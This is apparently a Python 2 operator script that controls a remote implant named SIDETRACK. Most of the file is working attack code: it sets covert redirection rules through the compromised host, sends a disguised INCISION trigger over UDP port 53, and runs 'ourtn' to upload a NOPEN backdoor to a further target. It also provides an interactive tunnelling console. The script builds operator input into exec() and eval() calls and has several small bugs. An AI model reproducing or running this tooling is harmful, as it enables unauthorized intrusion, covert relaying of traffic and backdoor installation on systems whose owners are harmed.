#!/usr/bin/python
import base
import string
import sys
import os
import crypto
import struct
import re
import thread
from socket import *
from select import *

def prints(myString):
    sys.stderr.write(myString)
    sys.stderr.write("\n")

def doSysExit(num):
    print 0
    sys.exit(num)

#------------------------------------------------------------------------
#  Name   : Usage
#  Purpose: Print the usage statement to the screen
#------------------------------------------------------------------------
def Usage():
    prints("Usage: <Sidetrack IP> [INCISION Target IP] [OPTIONS] -- [EXTRA OURTN OPTIONS]\n")
    prints("Options:")
    prints("       [-trigger <port>]        default is random > 10000")
    prints("       [-incisionCB <port>]     default is 17325")
    prints("       [-nopen <port>]          default is random > 10000")
    prints("       [-command <port>]        default is random")
    prints("       [-settime <timeoffset>]  default is 0")
    prints("       [-local <listenport> <target_ip> <connectport>]")
    prints("       [-kill <remoteconnection>, <localconnection>]")
    prints("       [-dontDone]")
    prints("       [-onlyDone]\n")
    

#------------------------------------------------------------------------
#  Name   : GetTarget
#  Purpose: Translate the user-supplied ip address into a target
#  Receive: ipAddress - The IP address of the SIDETRACK target
#  Return : The target corresponding to the ip address
#------------------------------------------------------------------------
def GetTarget(ipAddress):
    for targ in base.targetDict.keys():
        if base.targetDict[targ].ip == ipAddress:
            return base.targetDict[targ]
    return None

#------------------------------------------------------------------------
#  Name   : PrintPortFileError
#  Purpose: Display an error to the user about duplicate connections
#------------------------------------------------------------------------
def PrintPortFileError(sidetrackIp, port, filename):
                prints("It appears that another application is already connected to the SIDETRACK")
                prints("implant on %s.  It is listening for control messages on port %d."%(sidetrackIp,port))
                prints("If you feel this is an error, remove the %s file and try again"%(filename))

#------------------------------------------------------------------------
#  Name   : OpenPortFile
#  Purpose: Open the file that will store the port number for the control
#           channel
#  Receive: sidetrackIp - The IP address of the SIDETRACK target
#  Return : None on error, a file object on success
#------------------------------------------------------------------------
def OpenPortFile(sidetrackIp):
    # Try opening the file
    filename = "redirectorport-%s"%(sidetrackIp)
    try:
        f = open(filename, 'r')
        # The file opened.  Someone could already be redirecting
        # Let's verify this by sending a packet to the port
        port = f.read(6)
        try:
            port = eval(port)
            # Was able to read the port.  Lets send it a ?
            s = socket(AF_INET, SOCK_DGRAM, 0)
            s.connect(('127.0.0.1', port))
            try:
                s.send("?\n")
                s.setblocking(0)
                s.recv(50)
                # Now we know the other side is running
                PrintPortFileError(sidetrackIp, port, filename)
                return None
            except error, msg:
                if msg[1] != "Connection refused":
                    PrintPortFileError(sidetrackIp, port, filename)
                    return None
                # This probably means we have a stale port file
        except:
            # This probably means we have an invalid port file
            pass
        f.close()
    except:
        # this probably means we have no port file
        pass

    try:
        f = open(filename, 'w')
        return f
    except:
        prints("Unable to open file: %s"%(filename))
    return None
            
#------------------------------------------------------------------------
#  Name   : GetRandomPort
#  Purpose: Return a 16-bit random number
#  Return : Return a 16-bit random number
#------------------------------------------------------------------------
def GetRandomPort():
    rand = crypto.GetRandom()
    port = struct.unpack("H", rand[:2])[0]
    if port < 10000:
        port = port + 10000
    return port

#------------------------------------------------------------------------
#  Name   : doWorkaround
#  Purpose: Fix a kernel panic bug in SIDETRACK version 2.0
#  Return : 0 on failure, non-zero on success
#  Note   : SIDETRACK version 1.0 does not correctly handle the
#           -samesum redirection redirection option on the first
#           packet sent.  This function will ping the destination once
#           so that the INCISION trigger is not the first packet.
#------------------------------------------------------------------------
def DoWorkaround(session, targetIp):
    # Get the necessary commands
    rediradd = session.GetCommand("rediradd")
    redirrm  = session.GetCommand("redirrm")

    # Add a redirection rule for pings
    result = rediradd.run("icmp", "me", targetIp)
    prints(result[1])
    if result[0] == 0:
        return 0
    
    # Run ping
    rc = 1
    try:
        prints("Running: ping -c 1 -w 10 %s"%(targetIp))
        rc = os.spawnlp(os.P_WAIT, 'ping', 'ping', '-c', '1', '-w', '10', targetIp)
    except:
        pass

    result = redirrm.run(result[0])
    prints(result[1])

    if rc != 0:
        return 0
    return result[0]

#------------------------------------------------------------------------
#  Name   : CheckVersion
#  Purpose: Check to make sure this version of SIDETRACK is capable of
#           redirection
#  Receive: session  - The SIDETRACK session
#           targetIp - The final destination
#  Return : 0 - If this version of SIDETRACK cannot handle redirection
#           1 - If this version of SIDETRACK can handle redirection
#------------------------------------------------------------------------
def CheckVersion(session, targetIp):
    status    = session.GetCommand("status")
    result    = status.run()
    prints(result[1])
    verPos   = string.find(result[1], "Remote version: ")
    verPos   = verPos + 16
    afterVer = string.find(result[1], "\n", verPos)
    try:
        version = eval(result[1][verPos:afterVer])
        if version < 9:
            if version == 8:
                prints("Version 2.0 is currently installed. Using workaround")
                if DoWorkaround(session, targetIp) == 0:
                    prints("Unable to run ping.  Workaround failed")
                    done.run()
                    return 0
            else:
                prints("Versions of SIDETRACK less than 2.0 are currently not supported")
                return 0
                
    except:
        prints("Could not determine version of remote SIDETRACK implant")
        return 0
    return 1


#------------------------------------------------------------------------
#  Name   : ParseCommandLineOptions
#  Purpose: Read in and interpret the command line options
#------------------------------------------------------------------------
def ParseCommandLineOptions():
    global connectToPort
    global incisionPort
    global nopenPort
    global ourtnOpts
    global commandPort
    global optind
    global dontdone
    global onlydone
    global listenport
    global redirectip
    global redirectport
    global remoteremove
    global localremove
    global timeoffset
    
    while optind < len(sys.argv):
        if sys.argv[optind][0] != '-':
            Usage()
            prints("Invalid option %s"%(sys.argv[optind]))
            doSysExit(1)
        if sys.argv[optind][1] == 't':
            optind        = optind + 1
            try:
                connectToPort = eval(sys.argv[optind])
            except:
                Usage()
                prints("Invalid port number %s"%(sys.argv[optind]))
                doSysExit(1)
        elif sys.argv[optind][1] == 'i':
            optind       = optind + 1
            try:
                incisionPort = eval(sys.argv[optind])
            except:
                Usage()
                prints("Invalid port number %s"%(sys.argv[optind]))
                doSysExit(1)
        elif sys.argv[optind][1] == 's':
            optind       = optind + 1
            try:
                timeoffset = sys.argv[optind]
            except:
                Usage()
                prints("Invalid time offset %s"%(sys.argv[optind]))
                doSysExit(1)
        elif sys.argv[optind][1] == 'k':
            optind       = optind + 1
            try:
                remoteremove = eval(sys.argv[optind])
                optind       = optind + 1
                localremove  = eval(sys.argv[optind])
            except:
                Usage()
                prints("Invalid rule number");
                doSysExit(1)
                
        elif sys.argv[optind][1] == 'l':
            optind       = optind + 1
            try:
                listenport = eval(sys.argv[optind])
            except:
                Usage()
                prints("Invalid -local listenport number")
                doSysExit(1)
                
            optind       = optind + 1
            try:
                redirectip = sys.argv[optind]
            except:
                Usage()
                prints("Invalid -local target_ip")
                doSysExit(1)
                
            optind       = optind + 1
            try:
                redirectport = eval(sys.argv[optind])
            except:
                Usage()
                prints("Invalid -local connectport number")
                doSysExit(1)
        elif sys.argv[optind][1] == 'n':
            optind    = optind + 1
            try:
                nopenPort = eval(sys.argv[optind])
            except:
                Usage()
                prints("Invalid port number %s"%(sys.argv[optind]))
                doSysExit(1)
        elif sys.argv[optind][0] == 'c':
            optind      = optind + 1
            try:
                commandPort = eval(sys.argv[optind])
            except:
                Usage()
                prints("Invalid port number %s"%(sys.argv[optind]))
                doSysExit(1)
        elif sys.argv[optind][1] == '-':
            optind    = optind + 1
            ourtnOpts = optind
            break
        elif sys.argv[optind][1] == 'd':
            dontdone = 1
        elif sys.argv[optind][1] == 'o':
            onlydone = 1
        else:
            Usage()
            prints("Invalid option: %s"%(sys.argv[optind]))
            doSysExit(1)
        optind = optind + 1

#------------------------------------------------------------------------
#  Name   : DoIncisionToNopen
#  Purpose: Use SIDETRACK to:
#              1) Redirect and INCISION trigger and callback
#              2) Upload nopen using ourtn
#              3) Redirect a connection to nopen
#  Receive: session      - The SIDETRACK session
#           targetIp     - The final destination
#           incisionPort - The INCISION callback port
#           nopenPort    - The port for nopen redirection
#  Return : non-zero on success
#------------------------------------------------------------------------
def DoIncisionToNopen(session, targetIp, incisionPort, nopenPort):
    global nopenRuleNumber, incisionRuleNumber

    #
    # Initialize the globals
    #
    nopenRuleNumber    = None
    incisionRuleNumber = None
    
    #
    # Get the necessary command for redirection
    #
    rediradd  = session.GetCommand("rediradd")
    redirlist = session.GetCommand("redirlist")

    #
    # Take corrective actions if this is SIDETRACK version 2.0
    #
    result = CheckVersion(session, targetIp)
    if result == 0:
        return 0

    #
    # Add a redirection rule for the INCISION trigger
    #
    prints("Adding redirection rule for INCISION trigger")
    modTimesPort = (incisionPort*65449)%pow(2,16)
    trigger = rediradd.run("udp", \
                           "me:53/%d"%(modTimesPort), \
                           "%s:%d/53"%(targetIp, modTimesPort), \
                           "-afix", "-samesum",
                           "-longevity", "60s",
                           "-conntimeout", "10s",
                           "-nocrypto")
    prints(trigger[1])
    if trigger[0] == 0:
        return 0
    incisionRuleNumber = trigger[0]

    #
    # Add a redireciton rule for the INCISION callback and for NOPEN
    #
    prints("Adding redirection rule for INCISION callback and NOPEN connection" )
    result = rediradd.run("tcp",
                          "me:%d/%d"%(incisionPort, nopenPort),
                          "%s:%d/%d"%(targetIp, nopenPort, incisionPort),
                          "-longevity", "5h",
                          "-conntimeout", "5h")
    prints(result[1])
    if result[0] == 0:
        redirrm   = session.GetCommand("redirrm")
        redirrm.run(incisionRuleNumber)
        return 0
    nopenRuleNumber = result[0]

    prints("Listing rules")
    result = redirlist.run()
    prints(result[1])

    try:
        os.chdir("/current/bin")
        prints("Running: ./ourtn -l -p %d -i %s -o %d -ue %s" \
                         %(incisionPort,
                           sidetrackIp,
                           nopenPort,
                           targetIp))
        os.spawnlp(os.P_WAIT, './ourtn', 'ourtn', '-l', '-p', "%d"%(incisionPort),
                   '-i', sidetrackIp, '-o', "%d"%(nopenPort), '-ue', targetIp)
    except:
        prints("Unable to execute ourtn")
        return 0

    return 1

#-----------------------------------------------------------------------------
# Name   : ProcessArg
# Purpose: Tests to see if the argument is a string or number
# Receive: arg - The argument to test
# Return : The original string if a number, or a quoted string if not
#-----------------------------------------------------------------------------
def ProcessArg(arg):
    if (re.match('^-?[0-9]*(\.[0-9]+)?$',arg) != None or \
        re.match('^0x[0-9a-fA-F]+L?', arg) != None):
        return arg
    return '"' + arg + '"'

#------------------------------------------------------------------------
#  Name   : RunCommandChannel
#  Purpose: 
#  Receive: 
#  Return : 
#------------------------------------------------------------------------
def RunCommandChannel(session, channel):
    global running
    global readFds

    readFds = []

    readFds.append(channel)

    while running:
        result = select(readFds,[], [])
        for fd in range(len(result[0])):
            if result[0][fd] == channel:
                data = channel.recvfrom(500)
                command = data[0]
                if command[len(command)-1] == '\n':
                    command = command[:len(command)-1]
        
                cmdOut = ProcessCommand(session, command)
                if cmdOut[0] == 0:
                    running = 0
                try:
                    outMsg = "[%s]\n%s\n"%(command,cmdOut[1])
                    channel.sendto(outMsg, data[1])
                except:
                    pass
                
    channel.close()
    
#------------------------------------------------------------------------
#  Name   : SetupCommandChannel
#  Purpose: Initialize the command channel for sidetrack
#  Receive: sidetrackIp - The IP address of the SIDETRACK implant
#           listenPort  - The UDP port to listen on for commands
#  Return : None on error, the command channel on success
#------------------------------------------------------------------------
def SetupCommandChannel(sidetrackIp, listenPort):
    #
    # Make sure only one copy is running for this sidetrack host
    #
    portFile = OpenPortFile(sidetrackIp)
    if portFile == None:
        return None

    #
    # Bind to the requested port
    #
    listener = socket(AF_INET, SOCK_DGRAM, 0)
    try:
        listener.bind(('127.0.0.1', listenPort))
    except:
        prints("Unable to bind to port %d for command channel"%(listenPort))
        return None

    prints("Command channel on UDP port %d"%(listenPort))
    portFile.write("%d"%(listenPort))
    portFile.close()
    return listener

#------------------------------------------------------------------------
#  Name   : doHelp
#  Purpose: Display the help statement for the control channel
#  Return : The help statement
#------------------------------------------------------------------------
def doHelp(a=None, b=None, c=None, d=None, e=None, f=None, g=None, h=None):
    help =        "*********Sub commands*******\n"
    help = help + "  [r]emote listenport [target [port]] [-l listenTarget]\n"
    help = help + "  [l]ocal  listenport target [port [source_port]]\n"
    help = help + "  [u]dp    listenport target [port [source_port]]\n"
    help = help + "  [c]lose channel\n"
    help = help + "  [s]tatus  - prints status messages for channels\n\n"
    help = help + "  [q]uit - leaves the tunnel"
    return (1, help)
    
#------------------------------------------------------------------------
#  Name   : doQuit
#  Purpose: Exit the command channel
#------------------------------------------------------------------------
def doQuit(session):
    return (0, "Exiting control channel")

#------------------------------------------------------------------------
#  Name   : doRemote
#  Purpose: Setup a remote redirection
#  Receive: session      - The SIDETRACK session
#           listenPort   - The port to listen locally on
#           target       - The destination for the connection
#           port         - The destination port
#           optL         - '-l'
#           listenTarget - The IP address of the host to listen for
#------------------------------------------------------------------------
def doRemote(session, listenPort, target=None, port=None, optL=None, listenTarget=None):
    global lastTarget
    global connTo
    global redirTo
    
    rediradd = session.GetCommand("rediradd")

    #
    # Try to figure out the target
    #
    if target == '-l':
        target       = None
        listenTarget = port
        port         = None
    elif port == '-l':
        port         = None
        listenTarget = optL
        optL         = None

    #
    # Fill in some default values for the optional arguments
    #
    if target == None:
        target = "me"
    if port == None:
        port = listenPort
    if listenTarget == None:
        if lastTarget == None:
            return (1, "I have no idea who you're looking for")
        listenTarget = lastTarget
    else:
        lastTarget = listenTarget
        
    #
    # Add the redirection rule
    #
    result = rediradd.run("tcp",
                          "%s:%d/0"%(target, port),
                          "%s:0/%d"%(listenTarget, listenPort),
                          '-afix',
                          '-conntimeout', connTo,
                          '-longevity', redirTo)
    
    return (1, result[1])

#------------------------------------------------------------------------
#  Name   : doLocal
#  Purpose: Setup a local redirection
#  Receive: session    - The SIDETRACK session
#           listenPort - The port to listen locally on
#           target     - The destination for the connection
#           port       - The destination port
#           sourcePort - Use this source port when redirecting
#------------------------------------------------------------------------
def doLocal(session, listenPort, target, port=None, sourcePort=None):
    global lastTarget
    global connTo
    global redirTo

    lastTarget = target
    rediradd   = session.GetCommand("rediradd")

    if port == None:
        port = listenPort

    if sourcePort == None:
        localSource  = 0
        remoteSource = 0
        options      = None
    else:
        localSource  = sourcePort
        remoteSource = sourcePort
        options      = "-afix"

    result = rediradd.run("tcp",
                          "me:%d/%d"%(localSource, listenPort),
                          "%s:%d/%d"%(target, port, remoteSource),
                          '-tfix',
                          '-conntimeout', connTo,
                          '-longevity', redirTo,
                          options)
    if result[0] != 0:
        print "%d %d" %(rediradd.redir.remoteRuleNum,
                         rediradd.redir.localRuleNum)
    else:
        print "0"
    
    return (1, result[1])

#------------------------------------------------------------------------
#  Name   : doUdp
#  Purpose: Setup a local UDP redirection
#  Receive: session    - The SIDETRACK session
#           listenPort - The port to listen locally on
#           target     - The destination for the connection
#           port       - The destination port
#           sourcePort - Use this source port when redirecting
#------------------------------------------------------------------------
def doUdp(session, listenPort, target, port=None, sourcePort=None):
    global lastTarget
    global connTo
    global redirTo

    lastTarget = target
    rediradd   = session.GetCommand("rediradd")

    if port == None:
        port = listenPort

    if sourcePort == None:
        localSource  = 0
        remoteSource = 0
        options      = None
    else:
        localSource  = sourcePort
        remoteSource = sourcePort
        options      = "-afix"

    result = rediradd.run("udp",
                          "me:%d/%d"%(localSource, listenPort),
                          "%s:%d/%d"%(target, port, remoteSource),
                          '-tfix', connTo, redirTo,
                          '-conntimeout', connTo,
                          '-longevity', redirTo,
                          options)
    
    return (1, result[1])

#------------------------------------------------------------------------
#  Name   : doClose
#  Purpose: Terminate a redirection or connection
#  Receive: session - The SIDETRACK session
#           channel - The channel number to close
#------------------------------------------------------------------------
def doClose(session,a,b=None,c=None,d=None,e=None,f=None,g=None,h=None,i=None):
    redirset = session.GetCommand("redirset")
    connrm   = session.GetCommand("connrm")

    buffer = ""
    
    for letter in "abcdefghi":
        exec("channel = %s"%(letter))
        if channel != None:
            try:
                result = redirset.run(channel, 'inactive')
            except:
                result = connrm.run(channel)
                buffer = buffer + "\n%d: "%(channel) + result[1]
                continue
    
            if result[0] == 0:
                result = connrm.run(channel)
            buffer = buffer + "\n%d: "%(channel) + result[1]
        
    return (1, buffer)

#------------------------------------------------------------------------
#  Name   : doStatus
#  Purpose: Return status information about open redirections and connections
#  Receive: session - The SIDETRACK session
#------------------------------------------------------------------------
def doStatus(session):
    redirlist = session.GetCommand("redirlist")
    connlist  = session.GetCommand("connlist")

    result = redirlist.run()
    if result[0] != 0:
        out = result[1]
        result = connlist.run()
        out = out + "\n" + result[1]
        
    return (1, out)

#------------------------------------------------------------------------
#  Name   : ProcessCommand
#  Purpose: Run a command
#  Receive: session - The SIDETRACK session
#           command - The command to be processes and run
#------------------------------------------------------------------------
def ProcessCommand(session, command):

    args = base.SplitCommandString(command)

    if   args[0] == 'r':
        cmd = "doRemote"
    elif args[0] == 'l':
        cmd = "doLocal"
    elif args[0] == 'u':
        cmd = "doUdp"
    elif args[0] == 'c':
        cmd = "doClose"
    elif args[0] == 's':
        cmd = "doStatus"
    elif args[0] == 'q':
        cmd = "doQuit"
    elif args[0] == 'b':
        cmd = "doBurn"
    else:
        cmd = "doHelp"

    cmdString = "myVar = %s(session"%(cmd)
    for i in range(1,len(args)):
        cmdString = cmdString + ", " + ProcessArg(args[i])
    cmdString = cmdString + ")"
    try:
        exec(cmdString)
    except:
        return doHelp()
    return myVar


###############################################################
# Begin main()
###############################################################
#
# Establish a session with sttunctl
#
try:
    base.redir.connect("localhost", 912)
except:
    prints("Could not connect to sttunctl.  It it running?")
    doSysExit()

#
# Set the defaults
#
running       = 1
targetIp      = None
connectToPort = 0
cbToPort      = GetRandomPort()
cbFromPort    = GetRandomPort()
incisionPort  = 0
nopenPort     = 0
ourtnOpts     = 0
commandPort   = 0
dontdone      = 0
onlydone      = 0
connTo        = '5h'
redirTo       = '5h'
listenport    = 0
redirectip    = None
redirectport  = 0
remoteremove  = 0
localremove   = 0
timeoffset    = 0

#
# Handle the command line arguments
#
if len(sys.argv) < 2:
    Usage()
    doSysExit(1)

sidetrackIp  = sys.argv[1]

optind = 2
if (len(sys.argv) > optind) and (sys.argv[optind][0] != '-'):
    targetIp = sys.argv[optind]
    optind   = optind + 1

ParseCommandLineOptions()

#
# Get random port numbers (where necessary) and check the arguments
#
if connectToPort == 0:
    connectToPort = GetRandomPort()
    if connectToPort < 10000:
        connectToPort = connectToPort + 10000
if cbToPort < 10000:
    cbToPort = cbToPort + 10000
if cbFromPort < 10000:
    cbFromPort = cbFromPort = 10000
if commandPort == 0:
    commandPort = GetRandomPort()
    if commandPort == 0:
        commandPort = 6420
if targetIp != None:
    lastTarget = targetIp
    if incisionPort  == 0:
        incisionPort  = 17325
    if nopenPort     == 0:
        nopenPort     = GetRandomPort()
        if nopenPort < 10000:
            nopenPort = nopenPort + 10000
else:
    if incisionPort != 0 or nopenPort != 0:
        Usage()
        prints("Cannot use -incisionCB or -nopen without an INCISION Target IP")
        doSysExit(1)

ccChannel = SetupCommandChannel(sidetrackIp, commandPort)
if ccChannel == None:
    doSysExit(1)

#
# Get the target entry
#
target = GetTarget(sidetrackIp)
if target == None:
    prints("Invalid Sidetrack IP")
    doSysExit(1)

#
# Get a SIDETRACK implant
#
implant = base.GetImplant("SIDETRACK")

#
# Assign the implant and target to a session
#
session      = base.Session(target, implant)
session.name = 'sidetrack'

#
# Get the necessary commands for connection establishment
#
connect   = session.GetCommand("connect")
done      = session.GetCommand("done")
timediff  = session.GetCommand("timediff")
rrm       = session.GetCommand("redirrm")
lrm       = base.sessionDict['me'].GetCommand("redirrm")

if timeoffset != 0:
    result = timediff.run(timeoffset)
    prints(result[1])

prints("Connecting to %s (%s)\n" % (target.host, target.ip))

try:
    result = connect.run("me:%d/%d"%(cbToPort,cbFromPort), connectToPort)
    if result[0] == 0:
        prints("You're screwed")
        doSysExit(1)
    elif result[1][1] == 'a':
        prints("Canceled")
        doSysExit(1)
except:
    prints("Something went really wrong!")
    prints("This is most likely a problem with this script and not SIDETRACK.")
    doSysExit(1)
    
prints(result[1])
thread.start_new_thread(RunCommandChannel,(session, ccChannel))

#
# Setup an extra rule
#
if listenport != 0:
    if dontdone == 1:
        running = 0
    result = doLocal(session, listenport, redirectip, redirectport)
    prints(result[1])

#
# Remove existing rule
#
if localremove != 0:
    running = 0
    prints( rrm.run(remoteremove)[1] )
    prints( lrm.run(localremove)[1] )
    
#
# Get NOPEN up and running
#
if targetIp != None:
    result = DoIncisionToNopen(session, targetIp, incisionPort, nopenPort)
    if result == 0:
        prints("Could not get Nopen running....bailing")
        prints(result[1])
        targetIp = None

    

#
# Check to see if the command channel is still up
#
if running:
    prints("**** Entering command mode: Type 'q' to exit ****")
    cmdChannel = socket(AF_INET, SOCK_DGRAM, 0)
    cmdChannel.connect(('127.0.0.1', commandPort))
    targetIp = None

#
# Read command from the command line and send them to the command thread
# via the command channel (UDP port)
#
try:
    while running == 1 and onlydone == 0 and localremove == 0:
        try:
            command = raw_input("")
            if command == None:
                break
            elif len(command) < 1:
                continue
            cmdChannel.send(command)
            prints(cmdChannel.recv(65534))
        except:
            continue

except:
    pass

#
# Make sure we don't exit with others still needing redirection
#
if targetIp != None:
    try:
        while raw_input("Type BURN to exit SIDETRACK..: ") != "BURN":
            pass
    except:
        pass
    
if dontdone == 0:
    prints("Running the done command")
    if onlydone == 0:
        result = done.run()
    else:
        result = done.run("all")
    prints(result[1])
else:
    prints(lrm.run(session.localRedir.localRuleNum)[1])



